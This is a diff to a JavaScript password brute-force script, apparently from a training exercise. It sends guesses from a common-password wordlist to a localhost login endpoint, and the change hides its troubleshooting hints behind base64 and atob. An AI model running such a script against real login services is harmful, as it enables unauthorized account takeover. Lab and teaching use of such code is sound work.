@@ -1,20 +1,22 @@
 // Developer Comment: Sending username + password to this URL for verification. Change as required. 
 let URL_TO_TEST = "http://127.0.0.1:5000/verify_login"
 
-let i = 0
-let password_found = false
+// Developer Comment: Set HTTP request method for contacting server 
+let METHOD_TO_USE = "GET"
 
 // Developer Comment: Passwords to test using brute force. Add more common passwords as required.
 wordlist = ["123456", "12345678", "qwerty"]
+
+/////
+
+let i = 0
+let password_found = false
 
 var xhttp = new XMLHttpRequest();
 
 function makeRequest() {
     
     console.log("Trying password: " + wordlist[i])
-
-    // Set HTTP request method for contacting server 
-    let METHOD_TO_USE = "GET"
 
     let a = METHOD_TO_USE
     if (a == atob("R0VU")) {
@@ -42,7 +44,7 @@ xhttp.onreadystatechange = function() {
         return
     }
     else {
-        console.log("Script error: URL appears to be incorrect. What is the correct URL you need to use?")
+        console.log(atob("U2NyaXB0IGVycm9yOiBVUkwgYXBwZWFycyB0byBiZSBpbmNvcnJlY3QuIFdoYXQgaXMgdGhlIGNvcnJlY3QgVVJMIHlvdSBuZWVkIHRvIHVzZT8"))
         console.log("Stopping script...")
         return
     }
@@ -55,9 +57,9 @@ xhttp.onreadystatechange = function() {
     }
   } 
   else if (this.readyState == 4 && this.status == 404) {
-    console.log("Script error: URL NOT FOUND. URL used may be incorrect. What is the correct URL you need to use?")
+    console.log(atob("U2NyaXB0IGVycm9yOiBVUkwgTk9UIEZPVU5ELiBVUkwgdXNlZCBtYXkgYmUgaW5jb3JyZWN0LiBXaGF0IGlzIHRoZSBjb3JyZWN0IFVSTCB5b3UgbmVlZCB0byB1c2U/"))
   }
   else if (this.readyState == 4 && this.status == 405) {
-    console.log("Script error: METHOD NOT ALLOWED. HTTP request method used may be incorrect. What is the correct HTTP request method you need to use?")
+    console.log(atob("U2NyaXB0IGVycm9yOiBNRVRIT0QgTk9UIEFMTE9XRUQuIEhUVFAgcmVxdWVzdCBtZXRob2QgdXNlZCBtYXkgYmUgaW5jb3JyZWN0LiBXaGF0IGlzIHRoZSBjb3JyZWN0IEhUVFAgcmVxdWVzdCBtZXRob2QgeW91IG5lZWQgdG8gdXNlPw=="))
   }
 };
